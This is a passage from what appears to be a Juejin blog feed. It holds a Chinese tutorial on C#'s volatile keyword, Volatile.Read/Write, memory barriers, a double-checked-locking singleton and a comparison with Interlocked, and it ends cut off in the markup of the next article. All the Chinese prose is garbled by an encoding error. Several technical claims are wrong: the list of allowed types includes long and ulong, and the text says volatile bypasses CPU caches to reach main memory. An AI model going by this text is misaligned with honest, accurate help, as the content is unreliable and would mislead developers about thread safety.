                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ç®€ä»‹</h3>
<p><code>Volatile</code> æ˜¯ <code>C#</code> ä¸­å¤„ç†å†…å­˜å¯è§æ€§å’ŒæŒ‡ä»¤é‡æ’åºçš„å…³é”®æœºåˆ¶ï¼Œå®ƒæä¾›äº†å¯¹å†…å­˜è®¿é—®çš„ç²¾ç»†æ§åˆ¶ã€‚åœ¨å¹¶å‘ç¼–ç¨‹ä¸­ï¼Œ<code>volatile</code> å…³é”®å­—å’Œ <code>Volatile</code> ç±»éƒ½æ˜¯è§£å†³å…±äº«å˜é‡å¯è§æ€§é—®é¢˜çš„é‡è¦å·¥å…·ã€‚</p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦volatileï¼Ÿ</h3>
<h4 data-id="heading-2">CPU ç¼“å­˜å¯¼è‡´çš„ â€œå†…å­˜å¯è§æ€§â€ é—®é¢˜</h4>
<p>ç°ä»£ <code>CPU</code> ä¸ºæå‡æ€§èƒ½ï¼Œä¼šå°†é¢‘ç¹è®¿é—®çš„å˜é‡ç¼“å­˜åˆ°æ ¸å¿ƒä¸“å±çš„ç¼“å­˜ï¼ˆ<code>L1/L2/L3</code>ï¼‰ä¸­ï¼Œè€Œéæ¯æ¬¡éƒ½è¯»å†™ä¸»å†…å­˜ã€‚è¿™ä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>
<p>çº¿ç¨‹ A ä¿®æ”¹äº†å…±äº«å­—æ®µçš„å€¼ï¼ˆä»…å†™å…¥è‡ªå·±çš„ <code>CPU</code> ç¼“å­˜ï¼ŒæœªåŒæ­¥åˆ°ä¸»å†…å­˜ï¼‰ï¼›</p>
</li>
<li>
<p>çº¿ç¨‹ B è¯»å–è¯¥å­—æ®µæ—¶ï¼Œä»è‡ªå·±çš„ <code>CPU</code> ç¼“å­˜è¯»å–ï¼ˆä»æ˜¯æ—§å€¼ï¼‰ï¼Œæ— æ³•çœ‹åˆ°çº¿ç¨‹ A çš„ä¿®æ”¹ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">ç¼–è¯‘å™¨ / CPU çš„ â€œæŒ‡ä»¤é‡æ’åºâ€ ä¼˜åŒ–</h4>
<p>ç¼–è¯‘å™¨ï¼ˆ<code>C#</code> ç¼–è¯‘å™¨ï¼‰å’Œ <code>CPU</code> ä¸ºæå‡æ‰§è¡Œæ•ˆç‡ï¼Œä¼šåœ¨ä¸æ”¹å˜å•çº¿ç¨‹é€»è¾‘çš„å‰æä¸‹ï¼Œè°ƒæ•´æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåº</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åŸå§‹ä»£ç </span>
<span class="hljs-built_in">bool</span> _isReady = <span class="hljs-literal">false</span>;
<span class="hljs-built_in">int</span> _data = <span class="hljs-number">100</span>;

<span class="hljs-comment">// ç¼–è¯‘å™¨/CPUå¯èƒ½é‡æ’åºä¸ºï¼šå…ˆèµ‹å€¼_dataï¼Œå†èµ‹å€¼_isReadyï¼ˆå•çº¿ç¨‹æ— å½±å“ï¼‰</span>
<span class="hljs-comment">// ä½†å¤šçº¿ç¨‹ä¸‹ï¼Œçº¿ç¨‹Bå¯èƒ½çœ‹åˆ°_isReady=trueï¼Œä½†_dataè¿˜æ˜¯æ—§å€¼</span>
</code></pre>
<p><code>volatile</code> çš„æ ¸å¿ƒä½œç”¨å°±æ˜¯ï¼šç¦æ­¢ç¼“å­˜ + ç¦æ­¢æŒ‡ä»¤é‡æ’åºï¼Œä¿è¯å¤šçº¿ç¨‹å¯¹å­—æ®µçš„è®¿é—® â€œæ‰€è§å³æ‰€å¾—â€ã€‚</p>
<ul>
<li>
<p>æ’å…¥å†…å­˜å±éšœï¼ˆ<code>memory barrier</code>ï¼‰ï¼š</p>
<ul>
<li>
<p><code>Acquire Fence</code>ï¼šè¯»å– <code>volatile</code> å­—æ®µå‰ï¼Œç¦æ­¢å°†åç»­è¯»å–æå‰ã€‚</p>
</li>
<li>
<p><code>Release Fence</code>ï¼šå†™å…¥ <code>volatile</code> å­—æ®µåï¼Œç¦æ­¢å°†ä¹‹å‰å†™å…¥æ¨è¿Ÿã€‚</p>
</li>
</ul>
</li>
<li>
<p>å¼ºåˆ¶æ¯æ¬¡è¯»å†™éƒ½ç›´æ¥è®¿é—®ä¸»å†…å­˜ï¼Œç»•è¿‡ç¼“å­˜ä¼˜åŒ–ã€‚</p>
</li>
</ul>
<h3 data-id="heading-4">æ ¸å¿ƒå®šä¹‰ä¸è¯­æ³•</h3>
<h4 data-id="heading-5">è¯­æ³•è§„åˆ™</h4>
<p><code>volatile</code> åªèƒ½ä¿®é¥°å­—æ®µï¼Œä¸”æœ‰ä¸¥æ ¼çš„ç±»å‹é™åˆ¶ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ­£ç¡®ï¼šä¿®é¥°å®ä¾‹å­—æ®µ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-built_in">bool</span> _isRunning;

<span class="hljs-comment">// æ­£ç¡®ï¼šä¿®é¥°é™æ€å­—æ®µ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-built_in">int</span> _counter;

<span class="hljs-comment">// é”™è¯¯ï¼šä¸èƒ½ä¿®é¥°æ–¹æ³•/å‚æ•°/å±€éƒ¨å˜é‡/å±æ€§/å¸¸é‡</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DoWork</span>()</span> { } <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> VolatileProperty { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼ˆå±æ€§ä¸èƒ½åŠ volatileï¼‰</span>
</code></pre>
<h4 data-id="heading-6">æ”¯æŒçš„ç±»å‹</h4>
<p><code>volatile</code> ä»…æ”¯æŒä»¥ä¸‹ç±»å‹ï¼ˆé¿å… <code>CPU</code> æ“ä½œçš„åŸå­æ€§é—®é¢˜ï¼‰ï¼š</p>
<ul>
<li>
<p>å¼•ç”¨ç±»å‹ï¼ˆå¦‚ <code>object</code>ã€<code>string</code>ã€è‡ªå®šä¹‰ç±»ï¼‰ï¼›</p>
</li>
<li>
<p>å€¼ç±»å‹ï¼š<code>byteã€sbyteã€shortã€ushortã€intã€uintã€longã€ulongã€charã€floatã€bool</code>ï¼›</p>
</li>
<li>
<p>ä¸Šè¿°ç±»å‹çš„æŒ‡é’ˆï¼ˆå¦‚ <code>int*</code> ï¼‰ã€‚</p>
</li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼šä¸æ”¯æŒdoubleã€decimalã€structï¼ˆè‡ªå®šä¹‰å€¼ç±»å‹ï¼‰ã€DateTimeç­‰ï¼Œè¿™äº›ç±»å‹çš„è¯»å†™ä¸æ˜¯åŸå­çš„ï¼Œvolatileæ— æ³•ä¿è¯æ­£ç¡®æ€§ã€‚</p>
</blockquote>
<h4 data-id="heading-7">ç­‰æ•ˆæ–¹æ³•ï¼šVolatile.Read/Volatile.Write</h4>
<p>é™¤äº†å…³é”®å­—ï¼Œ<code>.NET</code> è¿˜æä¾› <code>Volatile</code> é™æ€ç±»çš„ <code>Read/Write</code> æ–¹æ³•ï¼ŒåŠŸèƒ½ä¸ <code>volatile</code> å…³é”®å­—ä¸€è‡´ï¼Œä½†æ›´çµæ´»ï¼ˆå¯åŠ¨æ€æ§åˆ¶è¯»å†™ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç­‰ä»·äº volatile ä¿®é¥°çš„ _isRunning = true</span>
Volatile.Write(<span class="hljs-keyword">ref</span> _isRunning, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// ç­‰ä»·äºè¯»å– volatile ä¿®é¥°çš„ _isRunning</span>
<span class="hljs-built_in">bool</span> current = Volatile.Read(<span class="hljs-keyword">ref</span> _isRunning);
</code></pre>
<h3 data-id="heading-8">æ ¸å¿ƒåŸç†ï¼šå†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</h3>
<p><code>volatile</code> çš„åº•å±‚æ˜¯é€šè¿‡æ’å…¥å†…å­˜å±éšœï¼ˆ<code>Memory Barrier</code>ï¼‰ å®ç°çš„ï¼š</p>
<ul>
<li>
<p>è¯»å±éšœï¼ˆ<code>Load Barrier</code>ï¼‰ï¼šè¯»å– <code>volatile</code> å­—æ®µæ—¶ï¼Œæ’å…¥è¯»å±éšœï¼Œå¼ºåˆ¶ <code>CPU</code> ä»ä¸»å†…å­˜è¯»å–å€¼ï¼Œè€Œéç¼“å­˜ï¼›åŒæ—¶ç¦æ­¢å°†è¯»æŒ‡ä»¤é‡æ’åºåˆ°å±éšœä¹‹å‰ã€‚</p>
</li>
<li>
<p>å†™å±éšœï¼ˆ<code>Store Barrier</code>ï¼‰ï¼šå†™å…¥ <code>volatile</code> å­—æ®µæ—¶ï¼Œæ’å…¥å†™å±éšœï¼Œå¼ºåˆ¶ <code>CPU</code> å°†å€¼å†™å…¥ä¸»å†…å­˜ï¼Œè€Œéç¼“å­˜ï¼›åŒæ—¶ç¦æ­¢å°†å†™æŒ‡ä»¤é‡æ’åºåˆ°å±éšœä¹‹åã€‚</p>
</li>
</ul>
<h3 data-id="heading-9">åŸºç¡€ä½¿ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-10">å…³é”®å­—ç”¨æ³•</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ThreadSafeFlag</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-built_in">bool</span> _isRunning = <span class="hljs-literal">true</span>;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Run</span>()</span>
    {
        <span class="hljs-comment">// çº¿ç¨‹1ï¼šå¾ªç¯ç›´åˆ°æ ‡å¿—å…³é—­</span>
        <span class="hljs-keyword">while</span> (_isRunning)
        {
            <span class="hljs-comment">// æ‰§è¡Œå·¥ä½œ</span>
            Thread.SpinWait(<span class="hljs-number">1000</span>);
        }
        Console.WriteLine(<span class="hljs-string">"çº¿ç¨‹åœæ­¢"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Stop</span>()</span>
    {
        <span class="hljs-comment">// çº¿ç¨‹2ï¼šè®¾ç½®æ ‡å¿—</span>
        _isRunning = <span class="hljs-literal">false</span>;
        Console.WriteLine(<span class="hljs-string">"åœæ­¢ä¿¡å·å·²å‘é€"</span>);
    }
}
</code></pre>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> flag = <span class="hljs-keyword">new</span> ThreadSafeFlag();
<span class="hljs-keyword">var</span> worker = <span class="hljs-keyword">new</span> Thread(flag.Run);
worker.Start();

Thread.Sleep(<span class="hljs-number">100</span>);
flag.Stop();  <span class="hljs-comment">// å¦ä¸€ä¸ªçº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°å˜åŒ–</span>
worker.Join();
</code></pre>
<p>ä¸åŠ  <code>volatile</code>ï¼šå¯èƒ½å¯¼è‡´ <code>_isRunning</code> è¢«ç¼“å­˜ï¼Œçº¿ç¨‹æ°¸è¿œä¸é€€å‡ºã€‚</p>
<h4 data-id="heading-11">Volatile ç±»é™æ€æ–¹æ³•ï¼ˆ.NET 4.5+ æ¨èï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Threading;

<span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _value;

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">ReadValue</span>()</span> =&gt; Volatile.Read(<span class="hljs-keyword">ref</span> _value);
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteValue</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> newValue</span>)</span> =&gt; Volatile.Write(<span class="hljs-keyword">ref</span> _value, newValue);
</code></pre>
<ul>
<li>
<p><code>Volatile.Read</code>ï¼šå¸¦ <code>Acquire</code> å±éšœçš„è¯»å–ã€‚</p>
</li>
<li>
<p><code>Volatile.Write</code>ï¼šå¸¦ <code>Release</code> å±éšœçš„å†™å…¥ã€‚</p>
</li>
<li>
<p>ä¼˜åŠ¿ï¼šæ›´ç²¾ç¡®æ§åˆ¶å±éšœæ–¹å‘ï¼Œæ¯”å…³é”®å­—æ›´çµæ´»ã€‚</p>
</li>
</ul>
<h4 data-id="heading-12">åŒæ£€æŸ¥é”å•ä¾‹</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton? _instance;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton Instance
    {
        <span class="hljs-keyword">get</span>
        {
            <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>)
            {
                <span class="hljs-keyword">lock</span> (<span class="hljs-keyword">typeof</span>(Singleton))
                {
                    <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>)
                        _instance = <span class="hljs-keyword">new</span> Singleton();
                }
            }
            <span class="hljs-keyword">return</span> _instance!;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> { }
}
</code></pre>
<h3 data-id="heading-13">ä¼˜ç‚¹ä¸ç¼ºç‚¹</h3>






























<table><thead><tr><th>æ–¹é¢</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td><strong>æ€§èƒ½</strong></td><td>æä½å¼€é”€ï¼ˆä»…å†…å­˜å±éšœï¼‰ï¼Œè¿œé«˜äºé”</td><td>ä»æ¯”æ™®é€šå˜é‡æ…¢ï¼ˆç¦ç”¨éƒ¨åˆ†ä¼˜åŒ–ï¼‰</td></tr><tr><td><strong>æ˜“ç”¨æ€§</strong></td><td>ç®€å•å…³é”®å­—æˆ–æ–¹æ³•è°ƒç”¨</td><td>è¯­ä¹‰å¤æ‚ï¼Œæ˜“è¯¯ç”¨</td></tr><tr><td><strong>é€‚ç”¨æ€§</strong></td><td>å®Œç¾ç”¨äºç®€å•æ ‡å¿—ä½ã€çŠ¶æ€åˆ‡æ¢ã€åŒæ£€æŸ¥é”</td><td><strong>ä¸èƒ½</strong>ç”¨äºè®¡æ•°å™¨ã€å¤åˆæ“ä½œ</td></tr><tr><td><strong>å®‰å…¨æ€§</strong></td><td>æä¾›å¿…è¦å†…å­˜æ¨¡å‹ä¿è¯</td><td>ä¸è¶³ä»¥å®ç°å¤æ‚åŒæ­¥</td></tr></tbody></table>
<h3 data-id="heading-14">æ¨èåœºæ™¯</h3>
<h4 data-id="heading-15">æ¨èä½¿ç”¨ <code>volatile</code> çš„åœºæ™¯ï¼š</h4>
<ul>
<li>
<p>å¸ƒå°”æ ‡å¿—ï¼ˆå¦‚åœæ­¢ä¿¡å· <code>_isRunning</code>ï¼‰ã€‚</p>
</li>
<li>
<p>çŠ¶æ€æšä¸¾ï¼ˆå¦‚ <code>Ready/Running/Stopped</code>ï¼‰ã€‚</p>
</li>
<li>
<p>å¼•ç”¨ç±»å‹å­—æ®µçš„åŒæ£€æŸ¥é”å•ä¾‹ã€‚</p>
</li>
<li>
<p>ä¸€å†™å¤šè¯»ï¼ˆ<code>one writer, multiple readers</code>ï¼‰æ¨¡å¼ã€‚</p>
</li>
</ul>
<h4 data-id="heading-16">ä¸æ¨èä½¿ç”¨ <code>volatile</code> çš„åœºæ™¯ï¼š</h4>
<ul>
<li>
<p>è®¡æ•°å™¨ã€ç´¯åŠ æ“ä½œ â†’ ç”¨ <code>Interlocked</code>ã€‚</p>
</li>
<li>
<p>å¤æ‚çŠ¶æ€ â†’ ç”¨ <code>lock</code> æˆ–æ— é”ç»“æ„ã€‚</p>
</li>
<li>
<p>64ä½å€¼ï¼ˆlong/doubleï¼‰åœ¨32ä½è¿›ç¨‹ â†’ ç”¨ <code>Interlocked</code>ã€‚</p>
</li>
</ul>
<h3 data-id="heading-17">Volatile vs Interlocked</h3>



































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>Volatile</th><th>Interlocked</th></tr></thead><tbody><tr><td>åŸå­æ€§</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å†…å­˜å±éšœ</td><td>Acquire / Release</td><td>Full Fence</td></tr><tr><td>è¿”å›æ—§å€¼</td><td>âŒ</td><td>âœ…</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>çŠ¶æ€è§‚å¯Ÿ</td><td>çŠ¶æ€ä¿®æ”¹</td></tr><tr><td>æ€§èƒ½</td><td>æ›´å¿«</td><td>ç¨æ…¢</td></tr></tbody></table>
<h3 data-id="heading-18">æ€»ç»“</h3>
<p><code>volatile</code> æ˜¯ <code>.NET</code> å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ä¸€ä¸ªä½çº§ä½†å…³é”®çš„å·¥å…·ï¼Œé€‚åˆç®€å•çš„ä¸€å†™å¤šè¯»æ ‡å¿—åœºæ™¯ã€‚ä½†ç»ä¸èƒ½æ»¥ç”¨ï¼Œå¤§å¤šæ•°çº¿ç¨‹å®‰å…¨éœ€æ±‚åº”ä¼˜å…ˆé€‰æ‹© <code>Interlockedã€lockã€Lazy&lt;T&gt;</code> æˆ–å¹¶å‘é›†åˆã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// è¯»ï¼šVolatile</span>
<span class="hljs-keyword">var</span> state = Volatile.Read(<span class="hljs-keyword">ref</span> _state);

<span class="hljs-comment">// å†™ï¼šCAS / Exchange</span>
<span class="hljs-keyword">if</span> (state == A)
    Interlocked.CompareExchange(<span class="hljs-keyword">ref</span> _state, B, A);
</code></pre>
<blockquote>
<p>Volatile æ˜¯å¹¶å‘ç¨‹åºçš„â€œè§‚å¯Ÿè€…åè®®â€ï¼Œ
Interlocked æ‰æ˜¯â€œä¿®æ”¹è€…åè®®â€ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ä¹ ä¸€äº›å¸¸ç”¨çš„æ··åˆæ¨¡å¼ä¹‹BlendMode.srcIn]]></title>    <link>https://juejin.cn/post/7592159803410497572</link>    <guid>https://juejin.cn/post/7592159803410497572</guid>    <pubDate>2026-01-07T09:05:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592159803410497572" data-draft-id="7592236397535232036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" å­¦ä¹ ä¸€äº›å¸¸ç”¨çš„æ··åˆæ¨¡å¼ä¹‹BlendMode.srcIn"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2026-01-07T09:05:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«æŸ´å°±æ˜¯æˆ‘"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             å­¦ä¹ ä¸€äº›å¸¸ç”¨çš„æ··åˆæ¨¡å¼ä¹‹BlendMode.srcIn
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«æŸ´å°±æ˜¯æˆ‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T09:05:38.000Z" title="Wed Jan 07 2026 09:05:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 